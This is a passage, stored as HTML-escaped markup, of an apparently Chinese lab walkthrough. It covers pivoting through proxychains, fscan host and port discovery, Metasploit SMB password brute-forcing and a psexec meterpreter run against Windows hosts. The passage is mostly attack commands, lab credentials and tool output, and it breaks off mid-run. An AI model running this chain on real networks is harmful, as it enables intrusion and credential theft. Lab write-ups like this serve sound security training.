class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.213\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.129\u003c/span\u003e -e \u003cspan class=\"hljs-number\"\u003e8888\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e设置\u003ccode\u003eproxychain4\u003c/code\u003e ，注意：\u003ccode\u003eproxychain4\u003c/code\u003e 只能代理\u003ccode\u003eTCP\u003c/code\u003e或者\u003ccode\u003eUDP\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e\u003cspan class=\"hljs-comment\"\u003e# vim /etc/proxychains4.conf   \u003c/span\u003e\nsocks5  \u003cspan class=\"hljs-number\"\u003e127.0\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.0\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.1\u003c/span\u003e       \u003cspan class=\"hljs-number\"\u003e1080\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e测试，因为上面通过查看\u003ccode\u003eNginx\u003c/code\u003e的反向代理配置得知Web服务器为\u003ccode\u003e192.168.93.120\u003c/code\u003e ，我们正常是不可以直接\u003ccode\u003ecurl\u003c/code\u003e到内容，但是通过代理后就可以直接\u003ccode\u003ecurl\u003c/code\u003e了\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e\u003cspan class=\"hljs-comment\"\u003e# 不经过代理\u003c/span\u003e\ncurl \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.93\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.120\u003c/span\u003e             \ncurl: (\u003cspan class=\"hljs-number\"\u003e7\u003c/span\u003e) Failed to connect to \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.93\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.120\u003c/span\u003e port \u003cspan class=\"hljs-number\"\u003e80\u003c/span\u003e after \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e ms: Could \u003cspan class=\"hljs-keyword\"\u003enot\u003c/span\u003e connect to server\n\u003cspan class=\"hljs-comment\"\u003e# 经过代理\u003c/span\u003e\nproxychains4 curl \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.93\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.120\u003c/span\u003e     \n[proxychains] config file found: /etc/proxychains4.conf\n[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so\u003cspan class=\"hljs-number\"\u003e.4\u003c/span\u003e\n[proxychains] DLL init: proxychains-ng \u003cspan class=\"hljs-number\"\u003e4.17\u003c/span\u003e\n[proxychains] Strict chain  ...  \u003cspan class=\"hljs-number\"\u003e127.0\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.0\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.1\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e1080\u003c/span\u003e  ...  \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.93\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.120\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e80\u003c/span\u003e  ...  OK\n\u0026#x3C;!DOCTYPE html\u003e\n\u0026#x3C;html lang=\u003cspan class=\"hljs-string\"\u003e\"en-gb\"\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003edir\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"ltr\"\u003c/span\u003e\u003e\n\u0026#x3C;head\u003e\n        \u0026#x3C;meta name=\u003cspan class=\"hljs-string\"\u003e\"viewport\"\u003c/span\u003e content=\u003cspan class=\"hljs-string\"\u003e\"width=device-width, initial-scale=1.0\"\u003c/span\u003e /\u003e\n        \u0026#x3C;meta charset=\u003cspan class=\"hljs-string\"\u003e\"utf-8\"\u003c/span\u003e /\u003e\n        \u0026#x3C;base href=\u003cspan class=\"hljs-string\"\u003e\"http://192.168.93.120/\"\u003c/span\u003e /\u003e\n      .....\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e内网主机探测\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e进入\u003ccode\u003eCentos\u003c/code\u003e命令行，然后上传\u003ccode\u003efscan\u003c/code\u003e 来扫描内网\u003c/p\u003e\n\u003cp\u003e然后将扫描结果存放到\u003ccode\u003e1.txt\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e./fscan -h \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.93\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.1\u003c/span\u003e/\u003cspan class=\"hljs-number\"\u003e24\u003c/span\u003e \u003e \u003cspan class=\"hljs-number\"\u003e1.\u003c/span\u003etxt \n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ccode\u003eICMP\u003c/code\u003e存活主机\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e(icmp) Target \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.93\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.100\u003c/span\u003e  \u003cspan class=\"hljs-keyword\"\u003eis\u003c/span\u003e alive\n(icmp) Target \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.93\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.10\u003c/span\u003e   \u003cspan class=\"hljs-keyword\"\u003eis\u003c/span\u003e alive\n(icmp) Target \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.93\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.20\u003c/span\u003e   \u003cspan class=\"hljs-keyword\"\u003eis\u003c/span\u003e alive\n(icmp) Target \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.93\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.30\u003c/span\u003e   \u003cspan class=\"hljs-keyword\"\u003eis\u003c/span\u003e alive\n(icmp) Target \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.93\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.120\u003c/span\u003e  \u003cspan class=\"hljs-keyword\"\u003eis\u003c/span\u003e alive\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e端口扫描\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.93\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.120\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e3306\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003eopen\u003c/span\u003e\n\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.93\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.100\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e3306\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003eopen\u003c/span\u003e\n\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.93\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.20\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e1433\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003eopen\u003c/span\u003e\n\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.93\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.30\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e445\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003eopen\u003c/span\u003e\n\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.93\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.20\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e445\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003eopen\u003c/span\u003e\n\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.93\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.10\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e445\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003eopen\u003c/span\u003e\n\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.93\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.30\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e139\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003eopen\u003c/span\u003e\n\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.93\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.20\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e139\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003eopen\u003c/span\u003e\n\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.93\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.10\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e139\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003eopen\u003c/span\u003e\n\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.93\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.10\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e135\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003eopen\u003c/span\u003e\n\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.93\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.30\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e135\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003eopen\u003c/span\u003e\n\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.93\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.20\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e135\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003eopen\u003c/span\u003e\n\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.93\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.20\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e80\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003eopen\u003c/span\u003e\n\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.93\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.120\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e80\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003eopen\u003c/span\u003e\n\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.93\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.100\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e80\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003eopen\u003c/span\u003e\n\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.93\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.100\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e22\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003eopen\u003c/span\u003e\n\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.93\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.120\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e22\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003eopen\u003c/span\u003e\n\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.93\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.10\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e88\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003eopen\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e主机系统\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e[*] NetInfo \n[*]\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.93\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.10\u003c/span\u003e\n   [-\u003e]WIN-8GA56TNV3MV\n   [-\u003e]\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.93\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.10\u003c/span\u003e\n[*] NetInfo \n[*]\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.93\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.30\u003c/span\u003e\n   [-\u003e]win7\n   [-\u003e]\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.93\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.30\u003c/span\u003e\n[*] NetInfo \n[*]\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.93\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.20\u003c/span\u003e\n   [-\u003e]win2008\n   [-\u003e]\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.93\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.20\u003c/span\u003e\n[*] OsInfo \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.93\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.30\u003c/span\u003e\t(Windows \u003cspan class=\"hljs-number\"\u003e7\u003c/span\u003e Professional \u003cspan class=\"hljs-number\"\u003e7601\u003c/span\u003e Service Pack \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e)\n[*] OsInfo \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.93\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.10\u003c/span\u003e\t(Windows Server \u003cspan class=\"hljs-number\"\u003e2012\u003c/span\u003e R2 Datacenter \u003cspan class=\"hljs-number\"\u003e9600\u003c/span\u003e)\n[*] OsInfo \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.93\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.20\u003c/span\u003e\t(Windows Server (R) \u003cspan class=\"hljs-number\"\u003e2008\u003c/span\u003e Datacenter \u003cspan class=\"hljs-number\"\u003e6003\u003c/span\u003e Service Pack \u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e)\n[*] NetBios \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.93\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.20\u003c/span\u003e   win2008.test.org                    Windows Server (R) \u003cspan class=\"hljs-number\"\u003e2008\u003c/span\u003e Datacenter \u003cspan class=\"hljs-number\"\u003e6003\u003c/span\u003e Service Pack \u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e\n[*] NetBios \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.93\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.10\u003c/span\u003e   [+] DC:WIN-8GA56TNV3MV.test.org      Windows Server \u003cspan class=\"hljs-number\"\u003e2012\u003c/span\u003e R2 Datacenter \u003cspan class=\"hljs-number\"\u003e9600\u003c/span\u003e\n[+] mysql \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.93\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.100\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e3306\u003c/span\u003e:root \u003cspan class=\"hljs-number\"\u003e123\u003c/span\u003e\n[+] mysql \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.93\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.120\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e3306\u003c/span\u003e:root \u003cspan class=\"hljs-number\"\u003e123\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e一台\u003ccode\u003eWIN7\u003c/code\u003e，一台\u003ccode\u003eserver2008\u003c/code\u003e ，以及\u003ccode\u003eserver2012\u003c/code\u003e并且都打开了\u003ccode\u003e445\u003c/code\u003e端口\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e总结当前信息\u003c/p\u003e\n\u003cp\u003e当前拿下了\u003ccode\u003eCentos\u003c/code\u003e主机\u003ccode\u003eroot\u003c/code\u003e权限，以及发现 域内主机\u003ccode\u003ewin2008\u003c/code\u003e和\u003ccode\u003ewin7\u003c/code\u003e 以及域控\u003ccode\u003eWIN-8GA56TNV3MV\u003c/code\u003e ，并且都开放了\u003ccode\u003e445\u003c/code\u003e端口\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch2\u003eSMB 口令爆破\u003c/h2\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003e使用MSF的\u003ccode\u003esmb_login\u003c/code\u003e模块进行爆破，尝试爆破\u003ccode\u003ewin2008\u003c/code\u003e的\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003emsf6 auxiliary(scanner/smb/smb_version) \u003e use uxiliary/scanner/smb/smb_login\nmsf6 auxiliary(scanner/smb/smb_login) \u003e \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003e threads \u003cspan class=\"hljs-number\"\u003e5\u003c/span\u003e\nmsf6 auxiliary(scanner/smb/smb_login) \u003e \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003e SMBuser administrator\nmsf6 auxiliary(scanner/smb/smb_login) \u003e \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003e rhosts \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.93\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.20\u003c/span\u003e\nmsf6 auxiliary(scanner/smb/smb_login) \u003e \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003e pass_file /root/Desktop/\u003cspan class=\"hljs-type\"\u003eDict\u003c/span\u003e/Blasting_dictionary-master/top10W.txt\nmsf6 auxiliary(scanner/smb/smb_login) \u003e run\n\n[*] \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.93\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.20\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e445\u003c/span\u003e     - \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.93\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.20\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e445\u003c/span\u003e - Starting SMB login bruteforce\n[+] \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.93\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.20\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e445\u003c/span\u003e     - \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.93\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.20\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e445\u003c/span\u003e - Success: \u003cspan class=\"hljs-string\"\u003e'.\\administrator:123qwe!ASD'\u003c/span\u003e Administrator\n[!] \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.93\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.20\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e445\u003c/span\u003e     - No active DB -- Credential data will \u003cspan class=\"hljs-keyword\"\u003enot\u003c/span\u003e be saved!\n[*] \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.93\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.20\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e445\u003c/span\u003e     - Scanned \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e of \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e hosts (\u003cspan class=\"hljs-number\"\u003e100\u003c/span\u003e% complete)\n[*] \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.93\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.20\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e445\u003c/span\u003e     - Bruteforce completed, \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e credential was successful.\n[*] \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.93\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.20\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e445\u003c/span\u003e     - You can \u003cspan class=\"hljs-built_in\"\u003eopen\u003c/span\u003e an SMB session \u003cspan class=\"hljs-keyword\"\u003ewith\u003c/span\u003e these credentials \u003cspan class=\"hljs-keyword\"\u003eand\u003c/span\u003e CreateSession \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003e to true\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e没想到成功了，的到密码\u003ccode\u003e123qwe!ASD\u003c/code\u003e （这个密码是我自己加上去的，因为我的字典爆破不出来，网上的writeup很多师傅都可以爆破，我就加上了）\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e再使用该密码测试域内其他机器\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003emsf6 auxiliary(scanner/smb/smb_login) \u003e \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003e rhosts \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.93\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.30\u003c/span\u003e\nmsf6 auxiliary(scanner/smb/smb_login) \u003e run\n\n[*] \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.93\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.30\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e445\u003c/span\u003e     - \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.93\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.30\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e445\u003c/span\u003e - Starting SMB login bruteforce\n[+] \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.93\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.30\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e445\u003c/span\u003e     - \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.93\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.30\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e445\u003c/span\u003e - Success: \u003cspan class=\"hljs-string\"\u003e'.\\administrator:123qwe!ASD'\u003c/span\u003e Administrator\n[!] \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.93\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.30\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e445\u003c/span\u003e     - No active DB -- Credential data will \u003cspan class=\"hljs-keyword\"\u003enot\u003c/span\u003e be saved!\n[*] \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.93\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.30\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e445\u003c/span\u003e     - Scanned \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e of \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e hosts (\u003cspan class=\"hljs-number\"\u003e100\u003c/span\u003e% complete)\n[*] \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.93\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.30\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e445\u003c/span\u003e     - Bruteforce completed, \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e credential was successful.\n[*] \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.93\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.30\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e445\u003c/span\u003e     - You can \u003cspan class=\"hljs-built_in\"\u003eopen\u003c/span\u003e an SMB session \u003cspan class=\"hljs-keyword\"\u003ewith\u003c/span\u003e these credentials \u003cspan class=\"hljs-keyword\"\u003eand\u003c/span\u003e CreateSession \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003e to true\n[*] Auxiliary module execution completed\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e最后发现\u003ccode\u003ewin2008\u003c/code\u003e和\u003ccode\u003ewin7\u003c/code\u003e都是同一密码\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch2\u003e使用psexec连接 \u0026#x26; 抓取密码\u003c/h2\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003e使用MSF里边的模块 连接\u003ccode\u003e192.168.93.20\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003emsf6 auxiliary(server/socks_proxy) \u003e use exploit/windows/smb/psexec                         \nmsf6 exploit(windows/smb/psexec) \u003e \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003e rhosts \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.93\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.20\u003c/span\u003e                                 \nmsf6 exploit(windows/smb/psexec) \u003e \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003e SMBUSER administrator  \nmsf6 exploit(windows/smb/psexec) \u003e \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003e SMBpass 123qwe!ASD                                   \nmsf6 exploit(windows/smb/psexec) \u003e \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003e payload windows/meterpreter/bind_tcp                 \nmsf6 exploit(windows/smb/psexec) \u003e run\n\n[*] \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.93\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.20\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e445\u003c/span\u003e - Connecting to the server...\n[*] \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.93\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.20\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e445\u003c/span\u003e - Authenticating to \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.93\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.20\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e445\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003eas\u003c/span\u003e user \u003cspan class=\"hljs-string\"\u003e'administrator'\u003c/span\u003e...\n[*] \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.93\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.20\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e445\u003c/span\u003e - Selecting 